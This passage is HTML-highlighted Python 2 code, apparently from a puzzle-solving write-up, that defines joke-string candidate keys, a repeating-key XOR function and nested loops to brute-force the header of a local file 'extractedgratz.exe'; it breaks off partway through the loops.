&lt;span style=&#34;color: #93A1A1&#34;&gt;key2&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;UNACCEPTABLE!&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key2[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;omglob&amp;#39;&lt;/span&gt;
 
&lt;span style=&#34;color: #93A1A1&#34;&gt;key3&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key3[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;you&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x27&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;re so good&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key3[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;you&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x27&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;re so bad&amp;#39;&lt;/span&gt;
 
&lt;span style=&#34;color: #93A1A1&#34;&gt;key4&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key4[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x66&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key4[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x01&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;
 
&lt;span style=&#34;color: #93A1A1&#34;&gt;key5&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key5[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;Sandboxes are fun to play in&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key5[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;I&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x27&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;m gonna sandbox your face&amp;#39;&lt;/span&gt;
 
&lt;span style=&#34;color: #93A1A1&#34;&gt;key6&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key6[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;I can haz decode?&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key6[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;Such fire. Much burn. Wow.&amp;#39;&lt;/span&gt;
 
&lt;span style=&#34;color: #93A1A1&#34;&gt;key7&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key7[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x09\x00\x00\x01&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key7[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;Feel the sting of the Monarch!&amp;#39;&lt;/span&gt;
 
&lt;span style=&#34;color: #93A1A1&#34;&gt;key8&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key8[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;! 50 1337&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key8[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;1337&amp;#39;&lt;/span&gt;
 
&lt;span style=&#34;color: #93A1A1&#34;&gt;key9&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key9[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;LETS GO SHOPPING&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key9[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;MATH IS HARD&amp;#39;&lt;/span&gt;
 
&lt;span style=&#34;color: #93A1A1&#34;&gt;key10&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key10[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;LETS GO MATH&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key10[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;SHOPPING IS HARD&amp;#39;&lt;/span&gt;
 
&lt;span style=&#34;color: #93A1A1&#34;&gt;key11&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key11[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x01\x02\x03\x05\x00\x78\x30\x38\x0d&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key11[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x07\x77&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;key12&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key12[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;backdoge.exe&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key12[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;
 
&lt;span style=&#34;color: #93A1A1&#34;&gt;key13&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key13[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;192.203.230.10&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key13[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;
 
&lt;span style=&#34;color: #93A1A1&#34;&gt;key14&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key14[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key14[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;jackRAT&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;index&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;index[i]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;


&lt;span style=&#34;color: #586E75&#34;&gt;# we want this to support variable length keys&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# so if the key is smaller than data, it will wrap around&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(mydata,mykey):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;keylen&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;len&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(mykey)&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;datalen&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;len&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(mydata)&lt;/span&gt;
    
    &lt;span style=&#34;color: #586E75&#34;&gt;# easier to just extend the key array, but probably not that memory efficient&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;# not that we care about it here ;)&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;mykey&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(datalen&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;keylen)&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; 
    
    &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;join(&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;chr&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ord&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(a)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ord&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(b))&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a,b&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;zip&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(mydata,key))&lt;/span&gt;


&lt;span style=&#34;color: #719e07&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;binascii&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hexlify,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unhexlify&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;myfile&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;file&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;c:&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;extractedgratz.exe&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;wholefile&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;myfile&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;read()&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;wholefile[:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;myfile&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;close()&lt;/span&gt;


&lt;span style=&#34;color: #93A1A1&#34;&gt;counter&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
      &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
        &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
          &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
            &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
              &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
                &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
                  &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
                    &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
